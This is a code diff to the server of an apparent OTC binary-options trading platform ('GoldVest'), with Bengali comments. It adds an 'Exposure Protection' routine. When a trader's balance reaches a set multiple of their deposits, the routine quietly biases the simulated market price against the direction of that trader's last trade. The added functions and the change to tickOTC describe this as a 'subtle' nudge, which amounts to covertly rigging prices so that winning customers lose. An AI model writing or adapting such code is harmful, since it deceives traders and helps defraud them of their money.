@@ -285,6 +285,12 @@ const _activeMarkets = new Set();
 const _forexPrices   = {};
 const _tradeStats    = {};
 
+// ── Exposure Protection — cache ──────────────────────────
+let _exposureConfig         = { enabled: false, threshold: 6 };
+let _exposureConfigLoadTime = 0;
+const _userDepositCache     = new Map(); // userId → { totalDeposits, loadTime }
+const _userTradeDir         = new Map(); // userId → 'up' | 'down' (last trade)
+
 // ── [SHADOW TRACKING - ধাপ ১] In-memory active trades map ──
 // এটি শুধুমাত্র observation/verification এর জন্য — settlement logic এখনও বদলায়নি।
 // Key: `${userId}/${tradeId}`, Value: { userId, tradeId, symbol, expiryTimestamp, status }
@@ -558,6 +564,52 @@ function saveLiveSubCandle(id, label, candle) {
 // ══════════════════════════════════════════════════════════
 // OTC ENGINE
 // ══════════════════════════════════════════════════════════
+// ── Exposure Protection — bias calculator ────────────────
+// Firestore exposure_config ৬০s cache করে পড়ে।
+// Active trades এর user দের balance/deposit ratio check করে।
+// threshold x+ হলে সেই user এর direction এর বিপরীতে subtle bias return করে।
+// tickOTC() এ price calculation এ যোগ হয় — settlement logic ছোঁয় না।
+async function _loadExposureConfig() {
+  const now = Date.now();
+  if (now - _exposureConfigLoadTime < 60000) return; // 60s cache
+  try {
+    const snap = await firestore.collection('settings').doc('exposure_config').get();
+    if (snap.exists) {
+      const d = snap.data();
+      _exposureConfig = {
+        enabled:   d.enabled   ?? false,
+        threshold: d.threshold ?? 6,
+      };
+    }
+    _exposureConfigLoadTime = now;
+  } catch(e) {}
+}
+
+async function _getUserTotalDeposits(userId) {
+  const cached = _userDepositCache.get(userId);
+  if (cached && Date.now() - cached.loadTime < 300000) return cached.totalDeposits; // 5m cache
+  try {
+    const snap = await firestore.collection('users').doc(userId).get();
+    const totalDeposits = snap.exists ? (snap.data().totalDeposits || 0) : 0;
+    _userDepositCache.set(userId, { totalDeposits, loadTime: Date.now() });
+    return totalDeposits;
+  } catch(e) {
+    return 0;
+  }
+}
+
+async function _getExposureBias(userId, currentBalFloat) {
+  if (!_exposureConfig.enabled) return 0;
+  const totalDeposits = await _getUserTotalDeposits(userId);
+  if (!totalDeposits || totalDeposits <= 0) return 0;
+  const ratio = currentBalFloat / totalDeposits;
+  if (ratio < _exposureConfig.threshold) return 0;
+  // threshold পার করেছে — user এর last trade direction এর বিপরীতে bias
+  const dir = _userTradeDir.get(userId);
+  if (!dir) return 0;
+  return dir === 'up' ? -1 : 1; // -1 = price down bias, +1 = price up bias
+}
+
 function randomTrend() {
   const r = Math.random();
   return r < 0.38 ? 1 : r < 0.76 ? -1 : 0;
@@ -661,7 +713,37 @@ function tickOTC(id) {
   const v = state.price * 0.0008 * volMul;
   const trendComponent  = state.trend * v * (ctrl.trendStrength || 0.6) * 0.35;
   const randomComponent = (Math.random() - 0.5) * v * 3.2;
-  state.price = Math.max(state.price + (trendComponent + randomComponent) * speed, 0.0001);
+
+  // ── Exposure bias — exposed user এর active trade দেখে subtle price nudge ──
+  // async হওয়ায় _activeTradesMemory থেকে এই market এর live trades এর
+  // user দের check করি — fire-and-forget, price এ lag নেই
+  let exposureBiasTotal = 0;
+  if (_exposureConfig.enabled) {
+    // প্রতি ১০ tick এ একবার check (500ms × 10 = 5s)
+    if (!state._exposureTick) state._exposureTick = 0;
+    state._exposureTick++;
+    if (state._exposureTick % 10 === 0) {
+      // fire-and-forget — price calculation block হবে না
+      (async () => {
+        await _loadExposureConfig();
+        for (const [key, t] of _activeTradesMemory) {
+          if (t.symbol !== id || t.status !== 'live') continue;
+          try {
+            const balR = await redisPub.get(`gv:bal:${t.userId}`);
+            const bal  = parseFloat(balR || '0');
+            const bias = await _getExposureBias(t.userId, bal);
+            if (bias !== 0) {
+              state._pendingExposureBias = (state._pendingExposureBias || 0) + bias;
+            }
+          } catch(e) {}
+        }
+      })();
+    }
+    exposureBiasTotal = (state._pendingExposureBias || 0) * v * 0.25;
+    state._pendingExposureBias = 0; // reset after use
+  }
+
+  state.price = Math.max(state.price + (trendComponent + randomComponent + exposureBiasTotal) * speed, 0.0001);
   if (state.price > state.candleHigh) state.candleHigh = state.price;
   if (state.price < state.candleLow)  state.candleLow  = state.price;
 
@@ -941,6 +1023,7 @@ async function main() {
   console.log('GoldVest Server starting (Admin SDK)...');
   watchFirestoreMarkets();
   await _recoverLiveTradesFromRTDB();
+  await _loadExposureConfig(); // Exposure Protection — startup এ একবার load
   _startActiveTradesShadowListener();
   setInterval(() => {
     _activeMarkets.forEach(id => {
@@ -1036,6 +1119,11 @@ http.createServer(async (req, res) => {
       await redisPub.set(`gv:bal:dirty:${userId}`, '1', 'EX', 3600);
 
       console.log(`[place-trade] userId=${userId} tradeId=${tradeId} amount=${amount} newBal=${newBal}`);
+
+      // ── Exposure Protection — user এর last trade direction save ──
+      if (trade.type === 'up' || trade.type === 'down') {
+        _userTradeDir.set(userId, trade.type);
+      }
 
       // 4a. Firestore থেকে market এর real payout নাও — client value বিশ্বাস করা হচ্ছে না
       let verifiedPayout = 92; // safe fallback
